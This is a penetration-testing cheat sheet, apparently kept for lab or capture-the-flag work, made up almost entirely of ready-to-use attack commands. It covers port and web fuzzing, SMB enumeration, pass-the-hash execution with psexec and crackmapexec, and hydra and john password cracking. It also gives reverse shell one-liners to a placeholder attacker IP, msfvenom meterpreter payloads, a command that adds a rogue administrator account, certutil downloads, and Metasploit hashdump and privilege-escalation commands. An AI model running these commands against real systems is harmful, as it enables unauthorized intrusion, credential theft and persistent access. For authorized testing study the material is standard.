# General

## Frequently Used Tools
```bash
# Nmap
nmap -sS -T4 -Pn -n -p- <target>
nmap -sS -sV -sC -T4 -Pn -n <target> -oA nmap-output

# ---

# Fuff
ffuf -u http://<domain>/FUZZ -w common.txt
ffuf -u http://<domain>/FUZZ -w common.txt -e .php,.txt,.html
ffuf -u http://FUZZ.target.com/ -w Discovery/DNS/subdomains-top1million-5000.txt
ffuf -u http://<domain>/ -H "Host: FUZZ.target.com" -w Discovery/DNS/subdomains-top1million-5000.txt -fs 1490
ffuf -u http://<domain>/login.php -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "user=admin&pass=FUZZ" -w unix_passwords.txt -fc 401

# ---

# SMBclient
smbclient -L <target> -N
smbclient -L <target> -U <user>
smbclient //<target>/<share> -U <user>

# ---

# Enum4linux
enum4linux -a
enum4linux -U
enum4linux -S
enum4linux -u <user> -p <pass> -a

# ---

# SMBmap
smbmap -H <target>
smbmap -H <target> -u <user> -p <pass>

# ---

# PSExec
psexec <user>@<target>
psexec \\computername -u <user> -p <pass> <cmd>
psexec Administrator@10.10.10.15 -hashes :8846f7eaee99301f9b5c23a7b118c39e

# ---

# crackmapexec
crackmapexec smb <target> -u Administrator -p <hash> -x <cmd>
crackmapexec winrm <target> -u <user> -p unix_passwords.txt
crackmapexec winrm <target> -u <user> -p <password> -x <cmd>

# ---

# Evil-winrm
evil-winrm -u <user> -p <password> -i <target>

# ---

# Hydra
hydra -L common_users.txt -P unix_passwords.txt <target> ssh -t 4
hydra -L common_users.txt -P unix_passwords.txt <target> ftp -t 4
hydra -L common_users.txt -P unix_passwords.txt <target> mysql -t 4

hydra -l <user> -P unix_passwords.txt <target> ssh -t 4
hydra -l <user> -P unix_passwords.txt <target> ftp -t 4
hydra -l <user> -P unix_passwords.txt <target> mysql -t 4

hydra -l <user> -P unix_passwords.txt <target> http-post-form "<path>:<data>:<failure_msg>"
hydra -l admin -P passwords.txt 10.10.10.15 http-post-form "/login.php:user=^USER^&pass=^PASS^:Login failed"

# ---

# John
john --format=NT --wordlist=unix_passwords.txt hashfile.txt
john --format=NT --wordlist=rockyou.txt hashfile.txt
john --show hashfile.txt
```

## Wordlists
```
# Default Creds
/usr/share/wordlists/metasploit/http_default_users.txt
/usr/share/wordlists/metasploit/http_default_pass.txt
/usr/share/wordlists/metasploit/snmp_default_pass.txt
/usr/share/wordlists/metasploit/postgres_default_pass.txt
/usr/share/wordlists/metasploit/tomcat_mgr_default_userpass.txt

# Sensitive files (Windows/Linux)
/usr/share/wordlists/metasploit/sensitive_files.txt
/usr/share/wordlists/metasploit/sensitive_files_win.txt

# Common Usernames & Passwords
/usr/share/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
/usr/share/wordlists/metasploit/password.lst

# Common Directories
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/wordlists/dirb/common.txt

# WP Plugins
/usr/share/wordlists/metasploit/wp-exploitable-plugins.txt
```

## Rev Shells
[revshell generator](https://www.revshells.com/)
```bash
# shell
sh -i >& /dev/tcp/_ATTACKER_IP_/_PORT_ 0>&1

# netcat
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc _ATTACKER_IP_ _PORT_ >/tmp/f

# php
php -r '$sock=fsockopen("_ATTACKER_IP_",_PORT_);exec("sh <&3 >&3 2>&3");'

# python
export RHOST="_ATTACKER_IP_";export RPORT=_PORT_;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

## MSFVenom Shells
```bash
# Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=_ATTACKER_IP_ LPORT=_PORT_ -f exe -o reverse.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=_ATTACKER_IP_ LPORT=_PORT_ -f jsp -o ./rev.jsp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=_ATTACKER_IP_ LPORT=_PORT_ -f aspx -o reverse.aspx
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=_ATTACKER_IP_ LPORT=_PORT_ -f aspx -o reverse.aspx

# Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=_ATTACKER_IP_ LPORT=_PORT_ -f elf -o reverse.elf
msfvenom -p java/jsp_shell_reverse_tcp LHOST=_ATTACKER_IP_ LPORT=_PORT_ -f raw -o shell.jsp
msfvenom -p java/shell_reverse_tcp LHOST=_ATTACKER_IP_ LPORT=_PORT_ -f war -o shell.war
msfvenom -p cmd/unix/reverse_python LHOST=_ATTACKER_IP_ LPORT=_PORT_ -f raw
msfvenom -p cmd/unix/reverse_bash LHOST=_ATTACKER_IP_ LPORT=_PORT_ -f raw -o shell.sh
```

## Useful Linux Commands
```bash
# Connecting to an RDP from Linux
xfreerdp /u:<user> /p:<pass> /v:<target>

# ---

# System & OS Enumeration
uname -a
hostname
hostnamectl
lsb_release -a
cat /etc/os-release
uptime

# ---

# User & Privilege Information
whoami
id
groups
who
w
last
sudo -l

# ---

# Network Enumeration
ip a
ip r
ifconfig
route -n
arp -a
ss -tulpn
netstat -tulpn

# ---

# Connectivity & DNS
ping <ip>
traceroute <ip>
tracepath <ip>
nslookup <domain>
dig <domain>

# ---

# Processes & Services
ps aux
ps -ef
top
htop
systemctl list-units --type=service
systemctl status <service>

# ---

# Logs & System Events
dmesg
journalctl
journalctl -xe
cat /var/log/auth.log
cat /var/log/syslog

# ---

# Searching & Enumeration Helpers
which <command>
whereis <command>
locate <file>
grep -R "password" /etc 2>/dev/null

# ---

# Environment & Configuration
env
printenv
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/

# ---

# Package & Software Info
dpkg -l
rpm -qa
apt list --installed
yum list installed
```

## Useful Windows Commands
```bash
# Creating a new user
net user Hacker Hacker123 /add
net localgroup Administrators Hacker /add

# ---

# System Information & Enumeration
systeminfo
hostname
whoami
whoami /priv
whoami /groups
set
ver

# ---

# Network Enumeration
ipconfig
ipconfig /all
arp -a
route print
netstat -ano
netstat -rn

# ---

# Running Processes & Services
tasklist
tasklist /svc
sc query
sc query state= all

# ---

# Security Configuration Checks
netsh advfirewall show allprofiles
netsh wlan show profiles
netsh wlan show interfaces

# ---

# Useful CMD Utilities
where <command>
findstr <text> <file>
type <file>
more <file>

# ---

# Downloading a file
curl https://example.com/file.zip -o localname.zip
powershell -Command "Invoke-WebRequest -Uri 'https://example.com/file.zip' -OutFile 'file.zip'"
certutil -urlcache -split -f "https://example.com/file.zip" file.zip
wget https://example.com/file.zip
```

## Metasploit Service Auxiliaries
```bash
# FTP (Port 21)
auxiliary/scanner/ftp/ftp_version
auxiliary/scanner/ftp/ftp_login
auxiliary/scanner/ftp/anonymous
auxiliary/scanner/ftp/ftp_enumusers

# ---

# SSH (Port 22)
auxiliary/scanner/ssh/ssh_version
auxiliary/scanner/ssh/ssh_login
auxiliary/scanner/ssh/ssh_enumusers

# ---

# MySQL (Port 3306)
auxiliary/scanner/mysql/mysql_version
auxiliary/scanner/mysql/mysql_login
auxiliary/scanner/mysql/mysql_enum
auxiliary/scanner/mysql/mysql_hashdump

# ---

# PostgreSQL (Port 5432)
auxiliary/scanner/postgres/postgres_version
auxiliary/scanner/postgres/postgres_login
auxiliary/scanner/postgres/postgres_enum

# ---

# HTTP/HTTPS (Ports 80, 443)
auxiliary/scanner/http/http_version
auxiliary/scanner/http/http_title
auxiliary/scanner/http/http_header
auxiliary/scanner/http/robots_txt
auxiliary/scanner/http/dir_scanner

# ---

# SMTP (Port 25)
auxiliary/scanner/smtp/smtp_version
auxiliary/scanner/smtp/smtp_enum
auxiliary/scanner/smtp/smtp_relay

# ---

# SMB (Ports 139, 445)
auxiliary/scanner/smb/smb_version
auxiliary/scanner/smb/smb_enumusers
auxiliary/scanner/smb/smb_enumshares
auxiliary/scanner/smb/smb_enumgroups

# ---

# SNMP (Port 161)
auxiliary/scanner/snmp/snmp_login
auxiliary/scanner/snmp/snmp_enum
auxiliary/scanner/snmp/snmp_enumusers

# ---

# RDP (Port 3389)
auxiliary/scanner/rdp/rdp_scanner
auxiliary/scanner/rdp/rdp_version
auxiliary/scanner/rdp/rdp_ntlm_info
auxiliary/scanner/rdp/rdp_login

# ---

# WinRM (Ports 5985/5986)
auxiliary/scanner/winrm/winrm_auth_methods
auxiliary/scanner/winrm/winrm_login
auxiliary/scanner/winrm/winrm_cmd

# ---

# Generic/Multi-Service Scanners
auxiliary/scanner/portscan/tcp
auxiliary/scanner/portscan/syn
auxiliary/scanner/discovery/service_identification
auxiliary/scanner/discovery/udp_probe
```

## Meterpreter Commands
```bash
# Core Session / Navigation
background: send session to background
exit: close session
sessions: manage active sessions
session -i <n>: interact with a session

# ---

# System Information
sysinfo: OS, architecture, hostname
getuid: current user context
getpid: current process ID
ps: running processes

# ---

# User & Privilege Awareness
whoami: current user
getprivs: available privileges (Windows)
getsystem: auth privilege escalation
hashdump: dumping passwords hashes

# ---

# Network Information
ipconfig: network interfaces (Windows)
ifconfig: network interfaces (Linux)
route: routing table
arp: ARP cache
netstat: network connections

# ---

# Process Interaction
ps: list processes
pgrep: find process
getpid: current process

# ---

# Post-Exploitation Framework Commands
load: load extensions
```
